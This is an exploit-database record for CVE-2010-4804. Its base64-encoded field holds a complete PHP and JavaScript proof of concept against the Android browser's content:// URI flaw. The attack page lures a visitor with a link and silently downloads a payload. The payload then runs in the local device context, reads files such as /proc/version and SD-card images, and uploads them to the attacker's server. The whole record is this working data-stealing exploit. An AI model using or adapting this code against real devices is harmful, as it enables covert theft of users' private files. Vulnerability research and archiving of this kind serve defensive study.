{
    "source": "exploit-database", 
    "exploit": "PD9waHAgDQovKiANCiogRGVzY3JpcHRpb246ICBBbmRyb2lkICdjb250ZW50Oi8vJyBVUkkgTXVsdGlwbGUgSW5mb3JtYXRpb24gRGlzY2xvc3VyZSBWdWxuZXJhYmlsaXRpZXMNCiogQnVndHJhcSBJRDogICA0ODI1Ng0KKiBDVkU6ICAgICAgICAgIENWRS0yMDEwLTQ4MDQNCiogQWZmZWN0ZWQ6ICAgICBBbmRyb2lkIDwgMi4zLjQNCiogQXV0aG9yOiAgICAgICBUaG9tYXMgQ2Fubm9uDQoqIERpc2NvdmVyZWQ6ICAgMTgtTm92LTIwMTANCiogQWR2aXNvcnk6ICAgICBodHRwOi8vdGhvbWFzY2Fubm9uLm5ldC9ibG9nLzIwMTAvMTEvYW5kcm9pZC1kYXRhLXN0ZWFsaW5nLXZ1bG5lcmFiaWxpdHkvDQoqDQoqIEZpbGVuYW1lOiAgICAgcG9jLnBocA0KKiBJbnN0cnVjdGlvbnM6IFNwZWNpZnkgZmlsZXMgeW91IHdhbnQgdG8gdXBsb2FkIGluIGZpbGVuYW1lcyBhcnJheS4gSG9zdCB0aGlzIHBocCBmaWxlDQoqICAgICAgICAgICAgICAgb24gYSBzZXJ2ZXIgYW5kIHZpc2l0IGl0IHVzaW5nIHRoZSBBbmRyb2lkIEJyb3dzZXIuIFNvbWUgYnVpbGRzIG9mIEFuZHJvaWQNCiogICAgICAgICAgICAgICBtYXkgcmVxdWlyZSBhZGp1c3RtZW50cyB0byB0aGUgc2NyaXB0LCBmb3IgZXhhbXBsZSB3aGVuIGEgR2VybWFuIGJ1aWxkIHdhcw0KKiAgICAgICAgICAgICAgIHRlc3RlZCBpdCBkb3dubG9hZGVkIHRoZSBwYXlsb2FkIGFzIC5odG0gaW5zdGVhZCBvZiAuaHRtbCwgZXZlbiB0aG91Z2ggLmh0bWwNCiogICAgICAgICAgICAgICB3YXMgc3BlY2lmaWVkLiANCioNCiogVGVzdGVkIG9uOiAgICBIVEMgRGVzaXJlIChVSyBWZXJzaW9uKSB3aXRoIEFuZHJvaWQgMi4yDQoqLw0KDQovLyAgTGlzdCBvZiB0aGUgZmlsZXMgb24gdGhlIGRldmljZSB0aGF0IHdlIHdhbnQgdG8gdXBsb2FkIHRvIG91ciBzZXJ2ZXINCiRmaWxlbmFtZXMgPSBhcnJheSgiL3Byb2MvdmVyc2lvbiIsIi9zZGNhcmQvaW1nLmpwZyIpOw0KDQovLyAgRGV0ZXJtaW5lIHRoZSBmdWxsIFVSTCBvZiB0aGlzIHNjcmlwdA0KJHByb3RvY29sID0gJF9TRVJWRVJbIkhUVFBTIl0gPT0gIm9uIiA/ICJodHRwcyIgOiAiaHR0cCI7DQokc2NyaXB0dXJsID0gJHByb3RvY29sLiI6Ly8iLiRfU0VSVkVSWyJIVFRQX0hPU1QiXS4kX1NFUlZFUlsiU0NSSVBUX05BTUUiXTsNCg0KLy8gIFN0YWdlIDA6ICBEaXNwbGF5IGludHJvZHVjdGlvbiB0ZXh0IGFuZCBhIGxpbmsgdG8gc3RhcnQgdGhlIFBvQy4NCmZ1bmN0aW9uIHN0YWdlMCgkc2NyaXB0dXJsKSB7DQogIGVjaG8gIjxiPkFuZHJvaWQgPCAyLjMuNDwvYj48YnI+RGF0YSBTdGVhbGluZyBXZWIgUGFnZTxicj48YnI+Q2xpY2s6IDxhIGhyZWY9XCIkc2NyaXB0dXJsP3N0YWdlPTFcIj5NYWxpY2lvdXMgTGluazwvYT4iOw0KfQ0KDQovLyAgU3RhZ2UgMTogIFJlZGlyZWN0IHRvIFN0YWdlIDIgd2hpY2ggd2lsbCBmb3JjZSBhIGRvd25sb2FkIG9mIHRoZSBIVE1ML0pTIHBheWxvYWQsIHRoZW4gYSBmZXcgc2Vjb25kcyBsYXRlciByZWRpcmVjdCANCi8vICAgICAgICAgICAgdG8gdGhlIHBheWxvYWQuIFdlIGxvYWQgdGhlIHBheWxvYWQgdXNpbmcgYSBDb250ZW50IFByb3ZpZGVyIHNvIHRoYXQgdGhlIEphdmFTY3JpcHQgaXMgZXhlY3V0ZWQgaW4gdGhlDQovLyAgICAgICAgICAgIGNvbnRleHQgb2YgdGhlIGxvY2FsIGRldmljZSAtIHRoaXMgaXMgdGhlIHZ1bG5lcmFiaWxpdHkuDQpmdW5jdGlvbiBzdGFnZTEoJHNjcmlwdHVybCkgew0KICBlY2hvICI8Ym9keSBvbmxvYWQ9XCJzZXRUaW1lb3V0KCd3aW5kb3cubG9jYXRpb249XCckc2NyaXB0dXJsP3N0YWdlPTJcJycsMTAwMCk7c2V0VGltZW91dCgnd2luZG93LmxvY2F0aW9uPVwnY29udGVudDovL2NvbS5hbmRyb2lkLmh0bWxmaWxlcHJvdmlkZXIvc2RjYXJkL2Rvd25sb2FkL3BvYy5odG1sXCcnLDUwMDApO1wiPiI7DQp9DQoNCi8vICBTdGFnZSAyOiAgRG93bmxvYWQgb2YgcGF5bG9hZCwgdGhlIEFuZHJvaWQgYnJvd3NlciBkb2Vzbid0IHByb21wdCBmb3IgdGhlIGRvd25sb2FkIHdoaWNoIGlzIGFub3RoZXIgdnVsbmVyYWJpbGl0eS4NCi8vICAgICAgICAgICAgVGhlIHBheWxvYWQgdXNlcyBBSkFYIGNhbGxzIHRvIHJlYWQgZmlsZSBjb250ZW50cyBhbmQgZW5jb2RlcyBhcyBCYXNlNjQsIHRoZW4gdXBsb2FkcyB0byBzZXJ2ZXIgKFN0YWdlIDMpLg0KZnVuY3Rpb24gc3RhZ2UyKCRzY3JpcHR1cmwsJGZpbGVuYW1lcykgew0KICBoZWFkZXIoIkNhY2hlLUNvbnRyb2w6IHB1YmxpYyIpOw0KICBoZWFkZXIoIkNvbnRlbnQtRGVzY3JpcHRpb246IEZpbGUgVHJhbnNmZXIiKTsNCiAgaGVhZGVyKCJDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT1wb2MuaHRtbCIpOw0KICBoZWFkZXIoIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sIik7DQogIGhlYWRlcigiQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZzogYmluYXJ5Iik7DQo/Pg0KPGh0bWw+DQogIDxib2R5Pg0KICAgIDxzY3JpcHQgbGFuZ3VhZ2U9J2phdmFzY3JpcHQnPg0KICAgICAgdmFyIGZpbGVuYW1lcyA9IEFycmF5KCc8P3BocCBlY2hvIGltcGxvZGUoIicsJyIsJGZpbGVuYW1lcyk7ID8+Jyk7DQogICAgICB2YXIgZmlsZWNvbnRlbnRzID0gbmV3IEFycmF5KCk7DQogICAgICBmdW5jdGlvbiBwcm9jZXNzQmluYXJ5KHhtbGh0dHApIHsNCiAgICAgICAgZGF0YSA9IHhtbGh0dHAucmVzcG9uc2VUZXh0OyAgICByID0gJyc7ICAgc2l6ZSA9IGRhdGEubGVuZ3RoOw0KICAgICAgICBmb3IodmFyIGkgPSAwOyBpIDwgc2l6ZTsgaSsrKSAgIHIgKz0gU3RyaW5nLmZyb21DaGFyQ29kZShkYXRhLmNoYXJDb2RlQXQoaSkgJiAweGZmKTsNCiAgICAgICAgcmV0dXJuIHI7DQogICAgICB9DQogICAgICBmdW5jdGlvbiBnZXRGaWxlcyhmaWxlbmFtZXMpIHsNCiAgICAgICAgZm9yICh2YXIgZmlsZW5hbWUgaW4gZmlsZW5hbWVzKSB7DQogICAgICAgICAgZmlsZW5hbWUgPSBmaWxlbmFtZXNbZmlsZW5hbWVdOw0KICAgICAgICAgIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICAgIHhoci5vcGVuKCdHRVQnLCBmaWxlbmFtZSwgZmFsc2UpOw0KICAgICAgICAgIHhoci5vdmVycmlkZU1pbWVUeXBlKCd0ZXh0L3BsYWluOyBjaGFyc2V0PXgtdXNlci1kZWZpbmVkJyk7DQogICAgICAgICAgeGhyLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgeyBpZiAoeGhyLnJlYWR5U3RhdGUgPT0gNCkgeyBmaWxlY29udGVudHNbZmlsZW5hbWVdID0gYnRvYShwcm9jZXNzQmluYXJ5KHhocikpOyB9IH0NCiAgICAgICAgICB4aHIuc2VuZCgpOw0KICAgICAgICB9DQogICAgICB9DQogICAgICBmdW5jdGlvbiBhZGRGaWVsZChmb3JtLCBuYW1lLCB2YWx1ZSkgew0KICAgICAgICB2YXIgZmUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbnB1dCcpOw0KICAgICAgICBmZS5zZXRBdHRyaWJ1dGUoJ3R5cGUnLCAnaGlkZGVuJyk7DQogICAgICAgIGZlLnNldEF0dHJpYnV0ZSgnbmFtZScsIG5hbWUpOw0KICAgICAgICBmZS5zZXRBdHRyaWJ1dGUoJ3ZhbHVlJywgdmFsdWUpOw0KICAgICAgICBmb3JtLmFwcGVuZENoaWxkKGZlKTsNCiAgICAgIH0NCiAgICAgIGZ1bmN0aW9uIHVwbG9hZEZpbGVzKGZpbGVjb250ZW50cykgew0KICAgICAgICB2YXIgZm9ybSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2Zvcm0nKTsNCiAgICAgICAgZm9ybS5zZXRBdHRyaWJ1dGUoJ21ldGhvZCcsICdQT1NUJyk7DQogICAgICAgIGZvcm0uc2V0QXR0cmlidXRlKCdlbmN0eXBlJywgJ211bHRpcGFydC9mb3JtLWRhdGEnKTsNCiAgICAgICAgZm9ybS5zZXRBdHRyaWJ1dGUoJ2FjdGlvbicsICc8Pz0kc2NyaXB0dXJsPz4/c3RhZ2U9MycpOw0KICAgICAgICB2YXIgaSA9IDA7DQogICAgICAgIGZvciAodmFyIGZpbGVuYW1lIGluIGZpbGVjb250ZW50cykgew0KICAgICAgICAgIGFkZEZpZWxkKGZvcm0sICdmaWxlbmFtZScraSwgYnRvYShmaWxlbmFtZSkpOw0KICAgICAgICAgIGFkZEZpZWxkKGZvcm0sICdkYXRhJytpLCBmaWxlY29udGVudHNbZmlsZW5hbWVdKTsNCiAgICAgICAgICBpICs9IDE7DQogICAgICAgIH0NCiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmb3JtKTsNCiAgICAgICAgZm9ybS5zdWJtaXQoKTsNCiAgICAgIH0NCiAgICAgIGdldEZpbGVzKGZpbGVuYW1lcyk7DQogICAgICB1cGxvYWRGaWxlcyhmaWxlY29udGVudHMpOw0KICAgIDwvc2NyaXB0Pg0KICA8L2JvZHk+DQo8L2h0bWw+DQo8P3BocA0KfQ0KDQovLyAgU3RhZ2UgMzogIFJlYWQgdGhlIGZpbGUgbmFtZXMgYW5kIGNvbnRlbnRzIHNlbnQgYnkgdGhlIHBheWxvYWQgYW5kIHdyaXRlIHRvIGEgZmlsZSBvbiB0aGUgc2VydmVyLg0KZnVuY3Rpb24gc3RhZ2UzKCkgew0KICAkZnAgPSBmb3BlbigiZmlsZXMudHh0IiwgInciKSBvciBkaWUoIkNvdWxkbid0IG9wZW4gZmlsZSBmb3Igd3JpdGluZyEiKTsNCiAgZndyaXRlKCRmcCwgcHJpbnRfcigkX1BPU1QsIFRSVUUpKSBvciBkaWUoIkNvdWxkbid0IHdyaXRlIGRhdGEgdG8gZmlsZSEiKTsgDQogIGZjbG9zZSgkZnApOyANCiAgZWNobyAiRGF0YSB1cGxvYWRlZCB0byA8YSBocmVmPVwiZmlsZXMudHh0XCI+ZmlsZXMudHh0PC9hPiEiOw0KfQ0KDQovLyAgU2VsZWN0IHRoZSBzdGFnZSB0byBydW4gZGVwZW5kaW5nIG9uIHRoZSBwYXJhbWV0ZXIgcGFzc2VkIGluIHRoZSBVUkwNCnN3aXRjaCgkX0dFVFsic3RhZ2UiXSkgeyANCiAgY2FzZSAiMSI6IA0KICAgIHN0YWdlMSgkc2NyaXB0dXJsKTsgDQogICAgYnJlYWs7IA0KICBjYXNlICIyIjogDQogICAgc3RhZ2UyKCRzY3JpcHR1cmwsJGZpbGVuYW1lcyk7IA0KICAgIGJyZWFrOyANCiAgY2FzZSAiMyI6IA0KICAgIHN0YWdlMygpOyANCiAgICBicmVhazsNCiAgZGVmYXVsdDogDQogICAgc3RhZ2UwKCRzY3JpcHR1cmwpOyANCiAgICBicmVhazsgDQp9IA0KPz4=", 
    "filename": "platforms/android/webapps/18164.php", 
    "id": "18164", 
    "cves": [
        "CVE-2010-4804"
    ]
}